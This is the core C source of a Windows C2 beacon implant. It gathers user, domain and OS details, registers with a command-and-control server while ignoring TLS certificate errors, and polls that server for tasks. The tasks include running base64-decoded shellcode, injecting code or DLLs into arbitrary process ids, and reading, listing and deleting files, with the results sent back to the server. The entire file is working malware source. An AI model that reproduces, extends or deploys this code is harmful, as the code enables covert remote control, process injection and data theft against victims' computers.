// platform specific headers needed so we can function

#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include <lm.h>
#include <winhttp.h>
#include <stdio.h>
#include <versionhelpers.h>

// json parsers
#include "../lib/json/jread.h"
#include "../lib/json/jwrite.h"

// local

#include "base64.h"
#include "strings.h"

// core header file

#include "core.h"

// include settings for callbacks

#include "settings.h"

// include stdlib function prototypes
#include "../lib/stdlib/stdlib.h"

// core functions
BOOL GetBasicUserInfo(PCHAR lpcUserName, PCHAR lpcDomainName, PCHAR lpsComputerName)
{

    /*
     * Get user info.
     * 
     * Retrieve infomation about the current user and domain context
     *
     */

    HANDLE hHeap, hToken = NULL;
    DWORD  dwCompBufLen  = MAX_PATH;    

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        DEBUG("OpenProcessToken(): FAILED");
        return FALSE;
    }

    if (!GetLogonFromToken(hToken, lpcUserName, lpcDomainName))
    {
        DEBUG("GetLogonFromToken(): FAILED");
        return FALSE;
    }

    if (!GetComputerNameA(lpsComputerName, &dwCompBufLen))
    {
        DEBUG("GetComputerNameA(): FAILED");
        return FALSE;
    }

    // if the computer name is the same as the domain
    // then this machine is not connected to a domain
    if (strcmp(lpsComputerName, lpcDomainName) == 0)
    {
        strcpy(lpcDomainName, "NULL");
    }

    return TRUE;
}

BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
{
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    RtlGetVersion(&osInfo);

    if (sizeof(void*) == 8)
        CompInfo->Arch = "x64";
    if (sizeof(void*) == 4)
        CompInfo->Arch = "x86";

    #ifdef SECURE
        CompInfo->Secure = "SECURE";
    #endif

    #ifndef SECURE
        CompInfo->Secure = "INSECURE";
    #endif

    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 10";
        return;
    }
    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        if (IsWindowsVersionOrGreater(osInfo.dwMajorVersion, 0, 1803))
        {
            CompInfo->OS = "Windows Server 2019";
            return;
        } else {
            CompInfo->OS = "Windows Server 2016";
            return;
        }
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 8.1";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows Server 2012 R2";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 8";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows Server 2012";
        return;
    }

    CompInfo->OS = "Windows";

}

// TODO: port this func to new json parser
// LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
// {

//     // get the 'alive' parameter of the json data and if its false... die

//     struct json_object *parsed_json;

//     parsed_json = json_tokener_parse(ReadBuffer);
//     parsed_json = json_object_object_get(parsed_json, "alive");

//     if (parsed_json != NULL)
//     {
//         if (!json_object_get_boolean(parsed_json))
//         {
//             DieCleanly();
//         }
//     }
// }
LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
{
    return;
}

LPVOID DieCleanly()
{
    // not much to say bout this lol
    exit(1);
}

BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize)
{

    /* callback and register this beacon with the C2 */

    // init some important variables

    BOOL                bResults = FALSE;
    DWORD               flags;
    CHAR                ReadBuffer[dwSize + 1];
    DWORD               dwDownloaded = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    struct jReadElement result;

    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        return FALSE;
    }

    // do the connection
    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);

        return FALSE;
    }

    // set up the request
    hRequest = WinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // finally send the actual request to the c2
    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);

    // make sure the request was successful
    if (bResults)
    {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    } else {
        if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
        {
            DEBUG("Failed to make callback");
        }

        DEBUG("WinHttpSendRequest error: %d\n", GetLastError());
    }

    // no lets get the session id
    if (bResults)
    {
        do
        {
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                // Theres no data avalible
                DEBUG("WinHttpQueryDataAvailable error\n");
                return FALSE;
            }

            if (!WinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                DEBUG("WinHttpReadData error\n");
                return FALSE;
            }

        } while (dwSize > 0);

    }

    // clean up the request stuffs now we are done with it.
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);

    // clean up the end
    ReadBuffer[strlen(ReadBuffer) - 1] = '\0';

    // read our id set by the C2
    jRead(ReadBuffer, "{'id'", &result);

    // set our global id variable
    *IdBuffer = '\0';
    strncat(IdBuffer, result.pValue, result.bytelen);

    return TRUE;
}

LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
{

    /*
    * BuildCheckinData
    * 
    * Build data in json format for callback to C2.
    * 
    */

    DWORD dwEstSize;
    CHAR* lpBuffer, *encoded_data = NULL;
    
    dwEstSize = lstrlen(Data) + 100;

    if (Mode == MODE_CHECKIN_DATA)
    {
        size_t b64_len_out = (size_t)(dwEstSize * 2);

        encoded_data = (CHAR*)malloc(b64_len_out * 2);
        if(encoded_data == NULL)
        {
            DEBUG("malloc(): FAILED");
            return NULL;
        }

        encoded_data = base64_encode((const char*)Data, lstrlen(Data), &b64_len_out);
        encoded_data[b64_len_out + 1] = '\0';

        lpBuffer = (CHAR*)malloc(dwEstSize + b64_len_out);
        if (lpBuffer == NULL)
        {
            DEBUG("malloc(): FAILED");
            return NULL;
        }
    } else
    {
        lpBuffer     = (CHAR*)malloc(dwEstSize);
    }

    switch (Mode)
    {
        case MODE_CHECKIN_NO_DATA:
            sprintf(
                lpBuffer, 
                "{\"id\":\"%s\"}", 
                IdBuffer
            );

            break;
        case MODE_CHECKIN_DATA:
            sprintf(
                lpBuffer, 
                "{\"id\":\"%s\",\"opcode\":%d,\"data\":\"%s\"}", 
                IdBuffer, 
                OpCode, 
                encoded_data
            );

            free(encoded_data);

            break;
        default:
            break;
    }

    // printf("%s\n", lpBuffer);

    return (LPCSTR *)lpBuffer;
}

LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
{
    /* callback to the c2 and check for a task or deliver data*/

    // init some important variables for are callback

    LPCWSTR*            ResBuffer;
    BOOL                bResults = FALSE;
    DWORD               dwAvailableBytesToRead = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    LPCSTR*             UriBuffer;
    DWORD               flags;

    char*               argsBuffer = NULL;
    struct              jReadElement result;

    // initiate the session
    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        return FALSE;
    }

    // do the connection
    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);

        return FALSE;
    }

    // set up the request
    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked

    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // build the data for the request

    if (SendOpCode != NULL)
    {
        UriBuffer = BuildCheckinData(SendOpCode, SendBuffer, MODE_CHECKIN_DATA);
    } else {
        UriBuffer = BuildCheckinData(NULL, NULL, MODE_CHECKIN_NO_DATA);
    }

    // finally send the actual request to the c2
    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
    free(UriBuffer);

    // make sure the request was successful

    if (bResults)
    {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;

        ResBuffer = "";

        do
        {

            // check how much available data there is

            dwSize = 0;

            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // out of data

            if (!dwSize)
            {
                break;
            }

            // allocate space for the buffer

            pszOutBuffer = (LPSTR)malloc(dwSize+1);

            if (!pszOutBuffer)
            {
                DEBUG("Out of memory\n");
                break;
            }

            // read all the data

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                return FALSE;
            }
            else
            {
                asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
            }

            // free the memory allocated to the buffer.

            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    // check if we need to die
    CheckIfDie(ResBuffer);

    // dont need to bother if we are just sending data
    if (SendOpCode == DO_CALLBACK)
    {
        return TRUE;
    }

    // get the opcode
    INT iOpCode = jRead_int(ResBuffer, "{'task'", JREAD_NUMBER);
    
    // set the opcode for the task
    *OpCode = (DWORD)iOpCode;

    // get the arguments for the task
    jRead(ResBuffer, "{'args'", &result);

    // clean up the json data to parse to the module
    if (result.bytelen != 0)
    {
        int i, j;

        argsBuffer = (CHAR *)malloc(result.bytelen + 1);

        memcpy(argsBuffer, result.pValue, result.bytelen);

        for(i=0; i<result.bytelen; i++)
        {
            if(argsBuffer[i] == '\\')
            {
                for(j=i; j<result.bytelen-1; j++)
                {
                    argsBuffer[j] = argsBuffer[j+1];
                }
    
                result.bytelen--;
                argsBuffer[result.bytelen] = '\0';
    
                i--;
            }
        }
    }

    // Cleanup handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    return argsBuffer;
}

BOOL SpawnExecuteCode(char* Base64Buffer)
{
    size_t out_len   = strlen(Base64Buffer) + 1;
    size_t b64_len   = b64_decoded_size(Base64Buffer);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);

    return SpawnCode(b64_out, b64_len);
}

BOOL InjectExecuteCode(char* Buffer)
{
    char* data;
    struct jReadElement result;

    // get pid to inject into
    int pid = jRead_int(Buffer, "{'pid'", JREAD_NUMBER);

    // get the base64 dll to inject
    jRead(Buffer, "{'data'", &result);

    // clean up the value
    data = result.pValue;
    data[result.bytelen] = '\0';

    // decode that base64 data
    size_t out_len   = strlen(data) + 1;
    size_t b64_len   = b64_decoded_size(data);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);

    // inject the code
    return InjectCode(b64_out, b64_len, pid);
}

BOOL InjectExecuteDll(char* Buffer)
{
    char* data;
    struct jReadElement result;

    // get pid to inject into
    int pid = jRead_int(Buffer, "{'pid'", JREAD_NUMBER);

    // get the base64 dll to inject
    jRead(Buffer, "{'dll'", &result);

    // clean up the value
    data = result.pValue;
    data[result.bytelen] = '\0';

    // decode that base64 dll
    size_t out_len   = strlen(data) + 1;
    size_t b64_len   = b64_decoded_size(data);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);

    // inject the code
    return InjectDLL(b64_out, b64_len, pid);
}

BOOL Stdlib(char* Buffer)
{
    char* data = NULL;
    struct jReadElement result;

    // read the opcode
    int op = jRead_int(Buffer, "{'op'", JREAD_NUMBER);

    // read the args
    jRead(Buffer, "{'args'", &result);

    // clean up the value
    char* args = result.pValue;
    args[result.bytelen] = '\0';

    switch (op)
    {

    case 0x1000:
        data = listdirs(args);
        break;

    case 0x2000:
        data = readfile(args);
        break;

    case 0x3000:
        data = getdir();
        break;

    case 0x4000:
        data = removefile(args);
        break;

    case 0x5000:
        data = makedirectory(args);
        break;

    case 0x6000:
        data = changedir(args);
        break;

    case 0x7000:
        data = getpid();
        break;

    case 0x8000:
        data = getps();
        break;
    }

    if (data != NULL)
    {
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, NULL, data, DO_CALLBACK, strlen(data));
    }

    return TRUE;
}

LPVOID ReportExecutionFail()
{
    return;
}